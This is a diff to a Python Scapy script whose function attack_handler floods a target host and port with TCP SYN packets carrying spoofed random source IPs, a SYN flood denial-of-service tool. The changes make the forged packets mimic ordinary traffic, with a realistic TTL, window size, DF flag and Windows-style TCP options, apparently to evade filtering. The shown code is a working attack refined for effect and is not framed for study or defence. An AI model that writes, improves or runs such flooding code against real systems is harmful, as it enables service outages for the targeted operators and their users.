@@ -14,15 +14,22 @@ def attack_handler(host_ip: str, port: int):
 
     while True:
         ip_packet = IP()
+        ip_packet.ihl = 5
         ip_packet.src = random_ip()
         ip_packet.dst = host_ip
+        ip_packet.ttl = 128
+        ip_packet.flags = "DF"
 
         tcp_packet = TCP()
         tcp_packet.sport = random.randrange(1, 65535)
         tcp_packet.dport = port
         tcp_packet.flags = "S"
+        tcp_packet.window = 64240
+        tcp_packet.options = [('MSS', 1460), ('NOP', None), ('WScale', 8), ('NOP', None), ('NOP', None), ('SAckOK', b'')]
 
-        send(ip_packet / tcp_packet, verbose=False)
+        packet = ip_packet / tcp_packet
+
+        send(packet, verbose=False)
 
         SENT_PACKETS += 1
 
@@ -45,7 +52,6 @@ def main():
     while True:
         print(f"Sent packets: {SENT_PACKETS}")
         time.sleep(1)
-
 
 if __name__ == "__main__":
     try:
